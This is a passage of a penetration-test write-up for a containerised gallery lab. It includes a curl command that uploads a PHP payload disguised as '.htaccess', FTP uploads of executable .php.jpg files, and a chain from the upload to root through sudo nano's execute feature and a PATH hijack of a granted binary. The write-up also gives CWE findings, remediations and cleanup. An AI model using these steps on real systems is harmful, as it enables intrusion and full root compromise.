+<p>The control arm and the treatment arm differ by <strong>one environment variable</strong>, in the same script, in the same second. The root-owned artefact is the oracle: it could not exist unless the hijacked <code>convert</code> ran as <code>uid=0</code>.</p>
+<p><strong>This is lab 146's F4 shape, in a different body.</strong> <code>gcc -B</code> there, <code>runme</code>→<code>convert</code> here. The transferable sentence is unchanged: <strong>when a privilege grant names a program, the grant's attack surface is the program <em>and every path that program resolves other programs through</em>.</strong> Ask what it <code>execve</code>s, and who can write to the directories it looks in.</p>
+<h3 id="hop-1b--the-undeclared-second-write-identity">Hop 1b — the undeclared second write identity</h3>
+<pre><code>vsftpd 3.0.5, anonymous login OK.
+STOR &lt;chroot root&gt;/DL77ftp_root.php      -&gt; 553 Could not create file.    (images/ is 0755 www-data)
+MKD dl77dir                               -&gt; 550 Create directory operation failed.
+STOR ftp/DL77ftp_&lt;fresh&gt;.php.jpg          -&gt; OK
+STOR ftp/&lt;same name&gt; again                -&gt; 553 Could not create file.  (vsftpd will not overwrite)
+</code></pre>
+<p>Only the pre-seeded <code>0777</code> <code>ftp/</code> subdirectory accepts writes, and only for a name that does not already exist. The file it accepts is <strong>authored by a different uid than the HTTP uploader</strong>:</p>
+<pre><code>$ stat -c &quot;%n %U:%G %a&quot; …/images/ftp/DL77ftp_1790801817.php.jpg …/images/ftp
+…/images/ftp/DL77ftp_1790801817.php.jpg ftp:ftp 644
+…/images/ftp                                nobody:nogroup 757
+$ getent passwd ftp
+ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+
+$ curl -s …/images/ftp/DL77ftp_ftp.php.jpg        # anonymous, no cookie
+FTP-FTP uid=33 euid=33  [200 text/html; charset=UTF-8]
+</code></pre>
+<p><strong>Authored by <code>uid=101(ftp)</code>, executed by <code>uid=33(www-data)</code>.</strong> The <code>.htaccess</code> and the global map both apply to the subdirectory, so the FTP write needs no new technique — but it is a second, independently reachable write primitive that the catalogue entry does not mention, and it is the reason <code>images/ftp</code> ships in the image at all.</p>
+<hr />
+<h2 id="8-instrumentation-defects--mine-and-four-of-them-produced-clean-wrong-output">8. Instrumentation defects — mine, and four of them produced clean wrong output</h2>
+<h3 id="81-ss-is-not-installed-and-it-printed-a-zero">8.1 <code>ss</code> is not installed, and it printed a zero</h3>
+<p><code>ss -lnt | wc -l</code> → <code>0</code> listeners, immediately after the service was serving three processes. <code>sh: ss: command not found</code>, and the pipe swallowed it. I would have reported &quot;0 listening sockets on the restored container&quot; — a claim about the instance, dressed as a verification of the restore. Replaced with <code>/proc/net/tcp</code>, which shows both listeners. <strong><code>self-corrections.md</code> §11 exactly: a missing command is visible, but a missing command behind a pipe is not.</strong></p>
+<h3 id="82-find--perm--uw-produced-14-101-writable-files-and-zero-of-the-six-i-checked-were-writable-by-the-writer">8.2 <code>find -perm -u+w</code> produced <strong>14 101</strong> &quot;writable&quot; files and <strong>zero</strong> of the six I checked were writable by the writer</h3>
+<p>This is the corpus's most-recorded trap and I walked into it through a different door — not <code>docker exec</code> as root, but a <strong>mode bit read as a permission</strong>.</p>
+<pre><code>$ (as www-data, inside the container)
+$ find / -xdev -perm -u+w -type f 2&gt;/dev/null | grep -vE &quot;^/(proc|sys|tmp|var/www)&quot; | wc -l
+14101
+$ stat -c &quot;%n %U:%G %a&quot; /etc/apache2/apache2.conf /etc/apache2/envvars /etc/.pwd.lock
+/etc/apache2/apache2.conf root:root 644
+/etc/apache2/envvars        root:root 644
+/etc/.pwd.lock              root:root 600
+</code></pre>
+<p><code>-u+w</code> is the <strong>owner's</strong> write bit. It is set on every root-owned 644 file in the filesystem, so it says nothing at all about <code>www-data</code>. The same predicate as the writing identity, in the same shell, in the same second:</p>
+<pre><code>  test -w /etc/apache2/apache2.conf                    NOT-WRITABLE
+  test -w /etc/apache2/envvars                         NOT-WRITABLE
+  test -w /etc/adduser.conf                            NOT-WRITABLE
+  test -w /etc/.netd-entry                             NOT-WRITABLE
+  test -w /etc/apache2/mods-available/php8.3.conf      NOT-WRITABLE
+  test -w /etc/vsftpd.conf                             NOT-WRITABLE
+  test -w /var/www/html/gallery/uploads/handler.php    WRITABLE      &lt;- the positive control
+</code></pre>
+<p>and the real write, with a marker and a before/after hash, because a predicate is a claim:</p>
+<pre><code>  /etc/apache2/apache2.conf  put_contents=false  before=d9c3dba8…  after=d9c3dba8…
+  /etc/apache2/envvars       put_contents=false  before=e4431a53…  after=e4431a53…
+</code></pre>
+<p>For contrast, the same <code>test -w</code> <strong>run as root through <code>docker exec</code></strong> — the thirteen-engagement trap the corpus already documents:</p>
+<pre><code>WRITABLE(as root) /etc/apache2/apache2.conf
+WRITABLE(as root) /etc/vsftpd.conf
+WRITABLE(as root) /etc/.pwd.lock
+</code></pre>
+<p><strong>Three different instruments, three different answers to the same question, and only one of them was about the boundary I cared about.</strong> The positive control is what made the difference: <code>handler.php</code> is <code>WRITABLE</code>, and I know independently that it is, because I had just uploaded over it.</p>
+<h3 id="83-getmyuid-returned-0-and-i-nearly-wrote-the-payload-ran-as-root">8.3 <code>getmyuid()</code> returned <code>0</code> and I nearly wrote &quot;the payload ran as root&quot;</h3>
+<p>My first probe printed <code>getmyuid()</code>. For a <code>www-data</code>-owned file that returns <code>33</code> <strong>by coincidence</strong> — <code>getmyuid()</code> is <em>the owner of the current PHP script</em>, not the process identity. When I copied the same payload into the document root as <code>root:root 644</code>, the probe printed <code>uid=0 euid=0</code> and, three lines later, <code>uid=33(www-data)</code>. The contradiction was inside one response.</p>
+<pre><code>EXEC DL77MARK-8f3a2c17b4 uid=0 euid=0
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+SAPI=apache2handler
+</code></pre>
+<p>Had I quoted the first line I would have filed a root execution that does not exist. Fixed by replacing it with <code>posix_getuid()</code> <strong>and</strong> <code>/proc/self/status</code>, which is what §5 and §7 report. The corroborating control that proved the server was not simply skipping an unreadable file:</p>
+<pre><code>  /dl77_m600.php  (root:root 600)  -&gt; 500
+  /dl77_m644.php  (root:root 644)  -&gt; MODE644-ROOT: RAN uid=33
+</code></pre>
+<p><strong>A <code>0</code> from an identity getter is a statement about the file, not about the process.</strong></p>
+<h3 id="84-i-destroyed-the-artefact-i-was-measuring-and-only-the-directory-listing-told-me">8.4 I destroyed the artefact I was measuring, and only the directory listing told me</h3>
+<p>Uploading with <code>filename=&quot;.htaccess&quot;</code> replaced the 362-byte control with 690 bytes of my own PHP — the directory is <code>www-data</code>-owned and <code>move_uploaded_file</code> truncates in place. The four-state differential had already completed, so the measurements stand, but the control was gone and the lab was left in a state I had not intended. Repaired from a copy taken <strong>before</strong> the experiment: <code>md5 ead3bfa54720efca3b7bd38bc94b27d8</code>, <code>diff</code> clean, <code>www-data:www-data 644</code>, and state A re-measured afterwards with the same three EXECUTED / two verbatim results.</p>
+<p>Read back after writing, every time, and take the copy before the experiment, not after.</p>
+<h3 id="85-grep--ril-reported-nothing-on-a-directory-that-contains-the-string">8.5 <code>grep -rIl</code> reported nothing on a directory that contains the string</h3>
+<p>My first reward sweep used <code>-I</code> (ignore binary). Its positive control — <em>search for a string I know is present</em> — came back empty on <code>/usr/local/bin</code>:</p>
+<pre><code>$ grep -rl  (no -I, no -a) on /usr/local/bin/ : 1
+$ grep -rIl (WITH -I, ignore binary)          : 0     &lt;- the control, reporting &quot;nothing found&quot;
+$ grep -ral (WITH -a, binary as text)         : 1
+$ strings -a /usr/local/bin/runme | grep -c &quot;Converting image&quot;
+1
+</code></pre>
+<p><strong><code>self-corrections.md</code> §12, reached through <code>grep</code> instead of <code>strings</code>.</strong> Had the control not been there, the sweep's &quot;0 matches&quot; would have been filed as a property of the target.</p>
+<h3 id="86-two-smaller-ones-for-the-record">8.6 Two smaller ones, for the record</h3>
+<ul>
+<li><strong><code>curl -F &quot;…;filename=a b;DROP.php&quot;</code> stored a file called <code>a b</code>.</strong> <code>;</code> is <code>curl</code>'s own option separator inside <code>-F</code>; the client truncated the name, not the server. Reading that as a server-side sanitiser would have been a fabricated control.</li>
+<li><strong><code>dpkg -V php8.3</code> returned <code>rc=0</code> and no output</strong> about a file that had been modified, because the file belongs to <code>libapache2-mod-php8.3</code>. A verifier pointed at the wrong package is a verifier that has not looked.</li>
+</ul>
+<hr />
+<h2 id="9-findings">9. Findings</h2>
+<h3 id="f1--unrestricted-upload-into-an-executable-directory-a-double-extension-reaches-uid33www-data-cwe-434-cwe-16">F1 — Unrestricted upload into an executable directory; a double extension reaches <code>uid=33(www-data)</code> (CWE-434, CWE-16)</h3>
+<p><code>handler.php</code> has <strong>no</strong> extension, content or size check (17 lines, quoted in §3), stores the client-supplied basename into a directory the server executes, and the engine is unrestricted over that directory. <code>.php</code> and <code>.php.jpg</code> both execute; <code>.jpg</code> does not; <code>.css</code> does not. Unauthenticated. <strong>Impact:</strong> unauthenticated RCE as <code>www-data</code>, which is floor 0 of a three-hop chain to <code>uid=0</code> (§7). <strong>Root cause:</strong> two decisions, not one — the missing application check, <em>and</em> the lab-injected <code>php8.3.conf:29-31</code>. <strong>Remediation:</strong> validate the extension <em>and</em> the bytes server-side; generate the stored name instead of trusting <code>basename()</code>; store uploads outside the document root; and delete <code>php8.3.conf:29-31</code>, which is what makes a double extension enough. Patching <code>handler.php</code> alone leaves the FTP write and every other writer working.</p>
+<h3 id="f2--the-only-per-directory-control-is-writable-through-the-vulnerability-it-protects-cwe-434--cwe-732">F2 — The only per-directory control is writable through the vulnerability it protects (CWE-434 + CWE-732)</h3>
+<pre><code>$ curl -F &quot;image=@payload2.php;filename=.htaccess&quot; http://[net-0-5]/gallery/uploads/handler.php
+Archivo subido exitosamente: .htaccess
+</code></pre>
+<p><code>images/</code> is <code>drwxr-xr-x www-data www-data</code> and <code>.htaccess</code> is <code>www-data:www-data 644</code>, so the same anonymous request that exploits the upload can <strong>rewrite or delete the upload directory's own configuration</strong> — and <code>AllowOverride All</code> means whatever it writes is honoured. Impact: the exposure survives any fix applied to the handler if the fix does not also make the directory <code>root</code>-owned, and an attacker can <em>add</em> mappings rather than only exploit existing ones. Remediation: <code>images/</code> <code>root:root</code>, uploads written by a privileged helper, <code>AllowOverride None</code> on the tree.</p>
+<h3 id="f3--sudo-grants-a-general-purpose-editor-with-a-built-in-command-execution-feature-across-a-target-account-cwe-269-cwe-250">F3 — <code>sudo</code> grants a general-purpose editor with a built-in command-execution feature, across a target account (CWE-269, CWE-250)</h3>
+<p><code>www-data ALL=(gallery) NOPASSWD: /bin/nano</code>, with no argument list, so any argv. nano 7.2's <code>^T Execute</code> runs a command as the nano process user, which here is <code>gallery</code>. Scoped to one program and one user — three negative controls refused and one granted on the same predicate — so this is a finding about <strong>the named program</strong>, not about sudo being open. Remediation: never grant an editor to a daemon account; point the grant at a purpose-built non-interactive script that takes its input as data, and pin the arguments.</p>
+<h3 id="f4--a-granted-driver-resolves-its-subprogram-out-of-a-path-the-grantee-controls-cwe-426-cwe-269--the-escalation-that-worked">F4 — A granted driver resolves its subprogram out of a <code>PATH</code> the grantee controls (CWE-426, CWE-269) — the escalation that worked</h3>
+<p><code>gallery ALL=(ALL) NOPASSWD: /usr/local/bin/runme</code>. <code>runme</code> hardcodes <code>system(&quot;convert /var/www/html/gallery/uploads/images/input.png …&quot;)</code>. The sudoers file has <code>secure_path</code> <strong>commented out</strong> and <code>Defaults:gallery env_keep += &quot;PATH&quot;</code> <strong>active</strong>. A file named <code>convert</code>, owned by <code>gallery</code>, in a directory <code>gallery</code> can create, is what <code>runme</code> executes — <strong>as <code>uid=0</code></strong>. Proved with a paired control in one run (§7) and a <code>root:root</code> artefact. Remediation: uncomment <code>secure_path</code>; delete <code>env_keep += &quot;PATH&quot;</code>; make <code>runme</code> a script that resolves its dependency by absolute path; and never grant a driver that <code>exec</code>s a bare name to a non-root account. <strong>F3 and F4 are separate findings with separate remediations</strong> — fixing the nano grant does not touch the <code>PATH</code> grant, and both are named so that a reviewer who patches one is told the other is still there.</p>
+<h3 id="f5--a-second-undeclared-write-primitive-anonymous-ftp-upload-into-the-same-executable-tree-cwe-434-cwe-22">F5 — A second, undeclared write primitive: anonymous FTP upload into the same executable tree (CWE-434, CWE-22)</h3>
+<p><code>vsftpd 3.0.5</code> with <code>anonymous_enable=YES</code>, <code>anon_upload_enable=YES</code>, <code>anon_root=/var/www/html/gallery/uploads/images</code>, <code>allow_writeable_chroot=YES</code>, <code>pasv_enable=NO</code>. The pre-seeded <code>0777 nobody:nogroup</code> <code>images/ftp</code> accepts <code>STOR</code> of a <strong>new</strong> name; the chroot root itself does not (<code>553</code>), and <code>MKD</code> is refused (<code>550</code>). A file stored there is authored by <code>uid=101(ftp)</code> and executes as <code>uid=33(www-data)</code>. The catalogue entry does not mention FTP at all. Remediation: if FTP is not a requirement, remove the service; if it is, chroot it somewhere outside the document root and re-enable <code>pasv_enable</code> with a restricted port range.</p>
+<h3 id="f6--directory-indexing-over-the-upload-directory-makes-every-payload-enumerable-cwe-548">F6 — Directory indexing over the upload directory makes every payload enumerable (CWE-548)</h3>
+<p><code>GET /gallery/uploads/images/</code> → <code>200</code>, 12 657 B of Apache autoindex, listing every uploaded artefact including the RCE payloads. Root cause is <code>apache2.conf:170-174</code> (<code>Options Indexes</code> on <code>/var/www/</code>), <strong>not</strong> the <code>.htaccess</code> — the <code>.htaccess</code>'s own <code>Options +Indexes</code> on line 11 is inert, and its comment on line 10 says the line <em>prevents</em> listing. Remediation: <code>Options -Indexes</code>, and stop shipping a comment that contradicts its directive.</p>
+<h3 id="f7--every-accounts-shell-hash-field-is-locked-there-is-no-credential-path-measured-reported-as-a-control">F7 — Every account's shell hash field is locked; there is no credential path (measured, reported as a control)</h3>
+<p>From <code>uid=0</code>: <code>/etc/shadow</code> shows <code>root:*:20115:…</code>, <code>daemon:*:…</code>, <code>bin:*:…</code>, <code>sys:*:…</code>. The only non-system account is <code>gallery:x:1001:1001::[lab-home]/gallery:/bin/sh</code>, and <code>su</code> to it fails with <code>Authentication failure</code> (no password set). There is no credential to shortcut the ladder with, so the floor count is a property of the policy rather than a plan.</p>
+<hr />
+<h2 id="10-reward--measured-absence">10. Reward — measured absence</h2>
+<p><strong>There is no <code>FLAG{}</code> in this image.</strong> Reported as a measurement, not an omission.</p>
+<p><strong>Primary search, run as <code>uid=0(root)</code> <em>inside the target</em>, through the hijacked <code>convert</code></strong> (so the identity is proved in the same breath):</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root)
+=== step1: positive control, text, known string ===
+/usr/local/bin/runme
+=== step2: work counts ===
+files=14193
+=== step3: content sweep, -a, excluding my own artefacts ===
+=== step4: done content ===
+=== step5: name sweep ===
+/usr/include/x86_64-linux-gnu/asm/processor-flags.h
+/usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
+/usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
+=== step6: done ===
+</code></pre>
+<p><strong>Counts: 14 193 files on one filesystem; 8 roots swept for content (<code>/etc /root /home /var /opt /srv /usr/local /tmp</code>) with <code>grep -a</code>; 0 matches. Name sweep: 6 hits, all libc/kernel headers matching <code>*flags*</code>, each inspected.</strong> The positive control fired (<code>/usr/local/bin/runme</code>), so the zero is a property of the target and not of the sweep.</p>
+<p><strong>Second, independent search, OPERATOR-SIDE</strong> (<code>docker exec</code> as root — labelled, not used as the primary): <code>files=14203</code>, <code>bytes=35270796724</code>, positive control <code>/usr/local/bin/runme</code>, <strong>0 matches</strong> after excluding my own artefacts.</p>
+<p>Two earlier sweeps deserve naming rather than hiding:</p>
+<ul>
+<li>The <strong>first</strong> content sweep reported <strong>2 hits</strong> — <code>…/images/g5run.sh</code> and <code>/tmp/dl77p/convert</code> — which are <strong>my own uploaded files containing the literal <code>FLAG{</code> inside their own grep pattern</strong>. <code>self-corrections.md</code> §26, hit for the fourth time in this corpus, and it is why the exclusion list is in the command and not applied afterwards.</li>
+<li>One in-target control run reported <strong>0</strong> for a string demonstrably present in <code>/usr/local/bin</code>, and a repeat seconds later reported <strong>1</strong> (§8.5). I am not claiming a mechanism for that disagreement. What matters is that the control caught it, and that without the control the &quot;no reward&quot; line would have rested on a detector never seen to fire.</li>
+</ul>
+<p><code>/root</code> is <code>0700</code> and was read only at <code>uid=0</code>. It contains <code>.bashrc</code>, <code>.profile</code>, an empty <code>.ssh/</code>, and <strong><code>.bash_histor</code></strong> — a <strong>character device</strong> <code>crw-rw-rw- 1, 3</code>, i.e. a symlink to <code>/dev/null</code> with a deliberately truncated name, the same small anti-forensic touch lab 146 found. It holds no history.</p>
+<p>The single source for &quot;does this corpus have rewards&quot; is the <code>FLAG{}</code> column of <a href="../labs.html"><code>../INDEX.md</code></a>. This writeup asserts no position in any sequence.</p>
+<hr />
+<h2 id="11-tested--not-tested--discarded-with-reason">11. Tested / not tested / discarded with reason</h2>
+<h3 id="tested-and-verified">Tested and verified</h3>
+<ul>
+<li>Full TCP surface; <code>/proc/net/tcp</code> and <code>/proc/net/udp</code> read directly; image <code>ExposedPorts</code>; the entrypoint.</li>
+<li>All three application files, both server-side PHP maps, the vhost, <code>AllowOverride</code>, and <code>sudoers</code>, read before attacking.</li>
+<li><strong>The lab-injected directive, proved by the package's own checksum database</strong> (<code>dpkg -V libapache2-mod-php8.3</code> → <code>??5?????? c</code>).</li>
+<li>Upload name matrix, <strong>9 names</strong>, each fetched anonymously with no cookie.</li>
+<li><strong>Four-state <code>.htaccess</code> differential</strong> (shipped / stripped / deleted / restored), with a byte-exact restore and a <code>diff</code>-clean verification.</li>
+<li>The three states in one directory: <code>.php</code> executing, PHP-in-<code>.jpg</code> served verbatim as <code>image/jpeg</code>, <code>.txt</code> as the positive control — plus a fourth, <code>.php.jpg</code> executing, which this lab adds.</li>
+<li>Globality of the <code>.php.&lt;ext&gt;</code> map: the same payload in two directories with no <code>.htaccess</code> ancestor.</li>
+<li>The <code>Options +Indexes</code> inertness differential.</li>
+<li>Impossible-name control <strong>before</strong> the sweep; 138 requests, 6 deviations, three of them byte-identical <code>403</code>s.</li>
+<li>Path traversal, 2 names, with the on-disk confirmation; 0 files outside <code>images/</code>.</li>
+<li>Arbitrary overwrite of a shipped asset (md5 before/after) and of the <code>.htaccess</code>.</li>
+<li>Second write identity: FTP login, <code>STOR</code> outcomes at three paths, overwrite refusal, on-disk owner, execution identity.</li>
+<li><code>sudo -n -l</code> at both identities, with 4 controls (3 deny, 1 grant) and 1 scope query.</li>
+<li>The <code>nano</code> <code>^T</code> escalation, proved by a <code>gallery</code>-owned artefact carrying its own <code>id</code>.</li>
+<li>The <code>runme</code>/<code>convert</code> <code>PATH</code> hijack, proved by a <strong>paired control in one run</strong> and a <code>root:root</code> artefact.</li>
+<li><code>find -u+w</code> vs <code>test -w</code> at two identities, plus a real write attempt with before/after hashes.</li>
+<li>Two reward searches with counts and positive controls.</li>
+</ul>
+<h3 id="not-tested-coverage-gaps-declared">NOT tested (coverage gaps, declared)</h3>
+<ul>
+<li><strong>UDP.</strong> <code>nmap -sU</code> needs root and is unavailable on this host. <strong>0 UDP sockets were bound</strong> per <code>/proc/net/udp</code> and the image declares only <code>21/tcp</code> and <code>80/tcp</code>, but I could not scan. A gap, not a closed port.</li>
+<li><strong>Whether the chain is reachable through FTP alone.</strong> I proved FTP writes execute as <code>www-data</code> (F5) and I proved <code>www-data → gallery → root</code> over HTTP (F3/F4). I did <strong>not</strong> assemble a single FTP-originated chain, because the first hop is the same code either way. <strong>0 attempts.</strong></li>
+<li><strong>Argument injection into <code>runme</code>.</strong> Not attempted: the command it <code>system()</code>s is a hardcoded string literal (read from the binary, §7), so there is no argv to reach. Discarded on the artefact, and the <em>replacement</em> attack was executed instead.</li>
+<li><strong>Whether the anonymous FTP identity <code>ftp</code> (101) has any sudo grant or writable path of its own.</strong> I read <code>sudo -n -l</code> as <code>gallery</code>, not as <code>ftp</code>, and I did not try to escalate from <code>uid=101</code> directly. <strong>0 attempts.</strong> It is plausible that the FTP session is a <em>shorter</em> route to <code>gallery</code>, and that is the first thing I would test with more time.</li>
+<li><strong><code>mod_status</code></strong> — the module is loaded and the endpoint returns <code>403</code>; the restriction was not characterised.</li>
+<li><strong>Whether <code>/usr/local/bin/runme</code> is safe to run repeatedly.</strong> It writes nothing (its <code>convert</code> never ran) and I invoked it 4 times.</li>
+</ul>
+<h3 id="discarded-with-reasons">Discarded, with reasons</h3>
+<ul>
+<li><strong>Path traversal through the upload</strong> — discarded after measurement: <code>basename()</code> (<code>handler.php:4</code>) collapsed both payloads into <code>images/</code>, and <code>/tmp/DL77trav*</code> does not exist.</li>
+<li><strong>Overwriting <code>handler.php</code> itself</strong> — the target directory is hardcoded to <code>__DIR__ . '/images/'</code> (<code>:3</code>), so the write cannot leave it.</li>
+<li><strong>Getting root from <code>www-data</code> directly</strong> — discarded on the sudoers, read at <code>uid=33</code>: the only grants are <code>/bin/nano</code> as <code>gallery</code> and <code>/bin/nano</code> as <code>www-data</code>, and <code>%sudo</code>/<code>%admin</code> do not list <code>www-data</code>. Three negative controls refused.</li>
+<li><strong>Editing the Apache config and reloading</strong> — discarded on measurement: <code>test -w</code> as <code>www-data</code> says <code>NOT-WRITABLE</code> for <code>/etc/apache2</code>, <code>/etc/apache2/envvars</code> and <code>mods-available/php8.3.conf</code>, and <code>apachectl -k graceful</code> as <code>www-data</code> cannot bind port 80 (<code>AH00072</code>).</li>
+<li><strong>Chasing the <code>find -perm -u+w</code> list</strong> — 14 101 files, 0 of the 6 checked writable by <code>www-data</code>, so discarded after the identity-correct re-test rather than pursued.</li>
+</ul>
+<hr />
+<h2 id="12-design-observation--the-lab">12. Design observation — the lab</h2>
+<p><strong>This is a well-built three-floor lab with one serious authoring error, and the error is the same shape lab 146 found: an inert directive that looks like the explanation.</strong></p>
+<p>What is good: the entry point is one fuzzable path, the payload is a double extension that a reader who only tried <code>.php</code> would miss, and floors 2 and 3 are two <em>different</em> escalation mechanisms — an interactive editor's built-in exec, then a granted driver's subprogram resolution. Nobody can memorise one trick and use it twice. The <code>gallery</code> account, the <code>runme</code> name and the gallery-of-images framing all cohere.</p>
+<p>What is wrong:</p>
+<ol>
+<li><strong><code>php8.3.conf:29-31</code> is the mechanism, and it is 31 lines into a stock-looking file with no comment</strong>, while the file that <em>names</em> the intended behaviour — <code>.htaccess:2</code>, with the comment &quot;Forzar ejecución como PHP&quot; — is one of two directives in a per-directory file, and its <em>other</em> directive (<code>Options +Indexes</code>) is inert and its comment says the opposite of what it does. A lab that ships a decoy mitigation teaches the reader that reading a config file is verification. The differential settles it in four requests; picking the plausible one does not.</li>
+<li><strong>The catalogue entry names one vulnerability and ships three.</strong> &quot;Simple web fuzzing and a file upload vulnerability&quot; describes hop 0. It does not mention the <code>sudoers</code> ladder, the <code>PATH</code> decision, or the FTP service. An analyst who reads the description and stops at the upload will conclude the lab is trivial, which is the description's failure and not the lab's — but the <em>lab</em> is the artefact that gets blamed.</li>
+<li><strong><code>/usr/local/bin/runme</code> is <code>740 root:gallery</code>.</strong> The group has <code>r--</code> and not <code>r-x</code>, so the file cannot be executed by <code>gallery</code> directly — only through <code>sudo</code>. That is deliberate and correct. But it also means <code>gallery</code> can <strong>read the binary</strong>, which is how I recovered the hardcoded <code>convert</code> command without guessing it. A lab that wants the driver opaque should have been <code>710</code> or <code>700</code>.</li>
+</ol>
+<hr />
+<h2 id="13-restoration">13. Restoration</h2>
+<p>Recreated from the image, not reverted (RUNBOOK §9).</p>
+<pre><code>$ docker rm -f galeria_container &amp;&amp; docker run -d --name galeria_container galeria:latest
+[net-0-5]
+</code></pre>
+<p><strong>Positive verification — the service is serving again:</strong></p>
+<pre><code>GET /                                   -&gt; 200 1772B
+GET /gallery/uploads/handler.php         -&gt; 200 148B
+GET /gallery/uploads/images/image_1.jpg -&gt; 200 335070B
+GET /gallery/uploads/images/            -&gt; 200 2389B
+7 processes matching apache2|vsftpd
+/proc/net/tcp listeners: 00000000:0050 (80), 00000000:0015 (21)
+</code></pre>
+<p><strong>Negative verification — my artefacts are gone, with counts:</strong></p>
+<pre><code>files in images/ matching dl77|^poc : 0
+DL77 markers anywhere in docroot   : 0
+/tmp DL77* files                  : 0
+images/.htaccess md5              : ead3bfa54720efca3b7bd38bc94b27d8   (shipped value)
+php8.3.conf md5                   : 78454ecf10f0bc2a189722c01c554d69   (shipped value)
+images/ftp contents               : 0
+image_1.jpg md5                   : 0b5131aa6eb53a9f4cf52f5673f90537   (the &quot;before&quot; value recorded pre-overwrite)
+docroot stray files               : 0
+GET /gallery/uploads/images/poc.php.jpg -&gt; 404 272B
+</code></pre>
+<p>That last line is the control that makes the restore's negative half mean something: <strong>404 / 272 B is byte-for-byte the impossible-name control's response</strong> (§6), so the 404 is an absence and not a variant of a present page.</p>
+<p>The image <code>galeria:latest</code> is still loaded, deliberately, so a retry does not re-extract 608 MB. Disk is shared and no <code>docker system prune</code>, <code>docker image prune -a</code> or <code>docker volume prune</code> was run; the seven <code>cybervault-*</code> containers were not touched.</p>
+<hr />
+<h2 id="14-what-feeds-forward">14. What feeds forward</h2>
+<p><strong>The class is already present</strong> (<code>corpus/146</code> filed &quot;MIME map&quot;, <code>corpus/296</code> filed &quot;Upload sin restricción · MIME map&quot;, <code>corpus/129</code> filed the two-identity upload, <code>corpus/12</code> filed the three-questions formulation), so per <code>PIPELINE.md</code> §Convergence this adds <strong>no new heading</strong>. What it adds is one sentence to the existing &quot;read the server's content-type → handler map&quot; row, and the sentence is a <em>narrowing</em>:</p>
+<blockquote>
+<p><strong>A per-directory <code>.htaccess</code> is not &quot;the inert one&quot; — it is either decisive or invisible, and which one it is depends on <code>AllowOverride</code>, not on the file.</strong> In lab 146 the <code>.htaccess</code> was dead because <code>AllowOverride None</code> had disabled it; in lab 77 the same directive class is the <strong>only</strong> thing that executes <code>.php5</code>, and a four-state differential shows it flipping in one column while <code>.php</code> and <code>.php.jpg</code> hold across all four. So: read <code>AllowOverride</code> first, then run the differential — and measure the <code>.htaccess</code>'s <strong>load-bearing set</strong>, which may be exactly one line out of eleven, while the line the author commented most carefully does nothing and says the opposite.</p>
+</blockquote>
+<p>And one more, for the sudo-rule oracle, alongside lab 146's <code>gcc -B</code> floor:</p>
+<blockquote>
+<p><strong>A <code>NOPASSWD</code> grant whose <code>Defaults</code> include <code>env_keep += &quot;PATH&quot;</code> and whose <code>secure_path</code> is commented out is a grant to the <em>interpreter of the granted program's name resolution</em>.</strong> The granted program does not have to be an editor or a shell; here it is a 16 KB C file whose entire content is <code>puts(&quot;Converting image...&quot;)</code> and <code>system(&quot;convert …&quot;)</code>. The test is unchanged — <em>what does the granted program <code>execve</code>, and who can write to the directories it looks in?</em> — and this instance adds the case where <strong>the answer is discoverable by reading the granted binary, because the sudo grant leaves it group-readable</strong>.</p>
+</blockquote>
+<hr />
+<h2 id="relevant-files">Relevant files</h2>
+<ul>
+<li><code>corpus/77/evidence/artefact-source.txt</code> — <code>handler.php</code> (17 lines), <code>images/.htaccess</code> (11 lines), <code>sudoers</code> tail, <code>php8.3.conf</code> in full, the <code>dpkg -V</code> deviation, the vhost, the <code>AllowOverride</code> blocks, <code>vsftpd.conf</code> — all with line numbers</li>
+<li><code>corpus/77/evidence/upload-matrix-and-sweep.txt</code> — the 9-name matrix, <code>/proc/self/status</code> from inside the executing process, the impossible-name control, and the 138-request sweep</li>
+<li><code>corpus/77/evidence/htaccess-differential.txt</code> — the four-state table, the globality probes, and the <code>Options +Indexes</code> inertness test</li>
+<li><code>corpus/77/evidence/chain-and-controls.txt</code> — every hop with its identity output, the out-of-band artefacts with their owners, and the four sudo negative controls</li>
+<li><code>corpus/77/evidence/reward-and-ftp.txt</code> — both reward searches with counts and positive controls, the two self-referential hits, the <code>grep -I</code> defect, and the full FTP transcript</li>
+<li><code>corpus/77/evidence/instrumentation-defects.txt</code> — the <code>find -u+w</code> vs <code>test -w</code> comparison at two identities, the <code>getmyuid()</code> contradiction, and the <code>grep -rIl</code> blindness</li>
+<li><code>corpus/77/evidence/auto_deploy.sh.read-only.txt</code> — read, never run</li>
+</ul>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
